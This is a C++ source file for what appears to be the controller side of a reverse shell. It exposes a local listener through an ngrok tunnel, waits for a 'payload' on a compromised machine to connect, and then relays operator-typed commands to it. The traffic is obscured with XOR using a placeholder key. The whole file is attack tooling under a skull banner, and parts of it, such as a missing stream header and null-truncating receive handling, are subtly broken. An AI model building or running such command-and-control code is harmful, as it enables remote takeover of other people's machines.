//g++ XOR.cpp -o XOR.o -ljsoncpp -I/usr/include/jsoncpp

#include <iostream>
#include <string>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <arpa/inet.h>
#include <json/json.h> // Include JSON library (make sure to install jsoncpp)

#define PORT 8080
#define BUFFER_SIZE 1024

// Function to perform XOR encryption/decryption
std::string xor_encrypt(const std::string& data, const std::string& key) {
    std::string output;
    for (size_t i = 0; i < data.size(); ++i) {
        output += data[i] ^ key[i % key.size()];
    }
    return output;
}

// Function to send encrypted output to the payload
void send_to_payload(int socket, const std::string& data, const std::string& encryption_key) {
    std::string encrypted_data = xor_encrypt(data, encryption_key);
    send(socket, encrypted_data.c_str(), encrypted_data.size(), 0);
}

// Function to receive encrypted commands from the payload
std::string receive_from_payload(int socket, const std::string& encryption_key) {
    char buffer[BUFFER_SIZE] = {0};
    recv(socket, buffer, BUFFER_SIZE, 0);
    return xor_encrypt(std::string(buffer), encryption_key);
}

// Function to start ngrok and return the forwarding address
std::string startNgrok(int port) {
    std::string command = "ngrok tcp " + std::to_string(port) + " > /dev/null &";
    system(command.c_str());
    sleep(5); // Give ngrok some time to start up

    std::string url;
    int tries = 5;
    while (tries > 0 && url.empty()) {
        std::string ngrokApi = "curl -s http://127.0.0.1:4040/api/tunnels";
        FILE* fp = popen(ngrokApi.c_str(), "r");
        if (fp) {
            char ngrokBuffer[BUFFER_SIZE];
            while (fgets(ngrokBuffer, sizeof(ngrokBuffer), fp) != NULL) {
                Json::Value tunnels;
                Json::CharReaderBuilder reader;
                std::string errs;
                std::istringstream s(ngrokBuffer);
                if (Json::parseFromStream(reader, s, &tunnels, &errs)) {
                    if (!tunnels["tunnels"].empty() && tunnels["tunnels"][0].isMember("public_url")) {
                        url = tunnels["tunnels"][0]["public_url"].asString();
                    }
                }
            }
            pclose(fp);
        }
        tries--;
        sleep(1);
    }
    return url;
}

// Main function
int main() {
    std::string encryption_key = "your_secret_key"; // Define your encryption key
    std::cout << "\033[0;32m";
    std::cout << R"(
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣤⣄⡀⠀⠀⠀⢀⣀⡀⣀⣠⣤⣤⠶⠶⠒⠒⠛⠛⠻⠷⠶⠦⢤⣀⠀⠀⠀⠀⠀⠀⠀⣠⠤⢖⣾⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣫⣁⠀⠉⠛⣷⣦⣶⠾⠋⠉⠡⠤⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⢷⣶⠶⠶⠚⠉⠀⠀⣽⣿⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⣤⣿⡿⠟⠛⠷⢶⣤⣄⣀⣀⠴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣀⠘⢷⣄⠀⣠⣶⣿⣿⣿⣧⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⠀⢤⣤⣶⣶⣶⠿⠋⠁⠀⠁⠛⠿⠟⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣁⣈⠻⣷⣿⣿⣿⣿⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣇⠀⢿⣿⡿⠂⠀⠀⠀⠀⠀⠀⢀⣴⣿⠿⠿⠛⠻⣿⣿⣿⡿⣿⣿⣿⣇⠈⠉⠛⠋⣁⣀⠈⠻⢿⣿⣿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣆⣠⡇⠀⠀⠀⠀⠀⠀⠀⠀⣼⡿⠛⠁⠀⠀⢠⠈⠙⢿⠇⡏⠘⣇⠙⠲⢶⣶⣿⣛⣛⣧⠄⠀⠙⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⣰⡟⠻⠃⡆⠀⠀⠀⠀⠀⠀⠀⢠⣿⡟⠐⣶⠚⠋⠉⣳⣦⣬⣴⣇⡀⠉⠳⢦⣴⠟⠛⠉⣿⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠛⠛⣡⣼⣾⡄⠀⠀⠀⠀⠀⠀⠀⢨⣿⣷⣆⣈⡛⠩⠉⠁⣨⡿⠟⢁⣀⠀⢠⠞⢿⣷⣶⡾⠛⢺⢤⢀⢀⠀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡾⠀⣼⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⢺⣿⣿⣿⣿⣿⣿⣿⣾⠏⠀⠐⠋⠉⠂⠀⠀⠈⠻⡿⠁⠀⠀⠘⠛⠹⢼⡿⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡇⣤⣽⣿⣿⠟⢀⠄⠀⠀⠀⠀⠀⠀⠀⠚⠿⢿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣶⣠⣴⣿⠇⣼⣿⡿⢋⣴⠏⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠙⣩⣸⣿⠀⠀⠀⢀⣠⣤⣴⣶⣶⣦⣄⠹⣷⡀⠀⠀⠀⣽⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⠟⢁⣾⣿⣿⣷⡿⢁⣰⡟⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣶⣿⣿⣿⡋⠀⠀⢠⣿⠛⣿⡿⠻⣿⣿⣿⣷⠹⣷⠀⠀⢀⣿⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⠃⠀⣾⣿⣿⣿⣫⣴⣿⠏⢀⣴⡇⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣷⢂⠀⠀⢿⣿⡟⢳⣶⣿⣿⢻⣿⠀⢹⡶⣠⣸⣿⠀⠀⠀⠀⠀
⠀⠀⠀⢠⣾⣿⣿⣿⣿⡟⠃⠀⢰⣿⣿⣿⣿⣿⡟⢁⣴⣿⠏⢀⣼⡆⠀⠀⠹⠇⠁⠻⠙⠟⠇⣿⣿⣿⢠⣄⠈⢿⣿⡄⣿⣿⣿⢸⠇⠀⢸⣿⣿⣿⣿⡆⠀⠀⠀⠀
⠀⢀⣴⣿⣿⣿⣿⣿⠟⠀⠀⠀⢠⣿⣿⣿⣿⣿⣶⣿⠟⠁⣠⣿⡿⠃⠀⢀⣠⣤⣤⣤⣄⣀⠀⢻⣿⣿⣿⣿⣦⣈⠛⢃⣿⡿⠿⠂⠀⣠⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀
⠀⣾⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⢫⣿⣿⣿⣿⣿⡟⢁⣠⣾⣿⠟⠁⠀⣰⡿⠛⣿⣿⣿⣿⣿⣯⡬⠛⠿⠿⠿⠿⠿⠿⠿⠛⠷⠶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀
⢸⣿⣿⣿⡿⠋⠀⠀⡀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣯⠖⠂⠀⠼⠋⢀⡾⣻⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣤⣶⣶⣿⣿⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀
⢸⣿⣿⣿⠟⠀⣰⡞⢠⠂⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣷⡾⣋⣠⣤⡄⠈⠰⢻⡿⣿⢿⣿⠿⣻⡿⢛⣽⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀
⢸⣿⣿⡟⢀⣾⣿⣱⣿⡞⡀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣾⣿⣿⣿⠇⠀⡀⠀⠀⠁⠚⠁⠘⠋⢠⡾⠃⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⡀
⠼⣻⣿⢡⣿⣿⣿⣿⣿⣷⡇⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⣾⣿⣀⡿⠀⣠⠄⠀⠀⠀⠀⠀⣤⡙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠣
⠀⢟⣿⣿⣿⣿⣿⣿⣿⣿⣿⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⣠⡄⣿⣿⣿⡇⢠⣿⡀⣾⢣⣾⣰⣆⢿⣿⣜⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠘⠃⠀
⠀⠺⠟⠋⣿⠟⠛⣽⣿⣿⣿⣿⣿⣿⢿⡿⠋⠘⣿⣿⣿⣿⣿⣇⣾⣿⣷⣿⣿⣿⣷⣄⢿⣿⣿⣸⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⡿⠉⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⠟⠛⣿⠟⠋⠀⠀⠀⠀⠀⠀⠈⣿⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⠇⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠹⢿⣿⡝⠿⣇⠙⠛⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⠻⣿⣿⠿⣿⣿⡿⢻⣿⣿⠋⠀⠀⠀⠀⠀⠁⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠟⠁⠀⠘⠋⠀⠈⢿⠇⠀⠙⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
)";

    std::cout << "\033[0m";
    
    // Start ngrok and get public URL
    std::string ngrok_url = startNgrok(PORT);
    std::cout << "Ngrok URL: " << ngrok_url << std::endl;

    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);

    // Creating socket file descriptor
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    // Forcefully attaching socket to the port
    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    // Bind the socket to the port
    if (bind(server_fd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    // Listen for incoming connections
    if (listen(server_fd, 3) < 0) {
        perror("listen");
        exit(EXIT_FAILURE);
    }

    std::cout << "Waiting for payload connection..." << std::endl;

    // Accept incoming connection
    if ((new_socket = accept(server_fd, (struct sockaddr*)&address, (socklen_t*)&addrlen)) < 0) {
        perror("accept");
        exit(EXIT_FAILURE);
    }

    std::cout << "Payload connected." << std::endl;

    // Communication loop
    while (true) {
        std::string command;
        std::cout << "Enter command to send: ";
        std::getline(std::cin, command);
        
        send_to_payload(new_socket, command, encryption_key);
        
        // Receive response
        std::string response = receive_from_payload(new_socket, encryption_key);
        std::cout << "Response from payload: " << response << std::endl;
    }

    // Cleanup
    close(new_socket);
    close(server_fd);
    return 0;
}

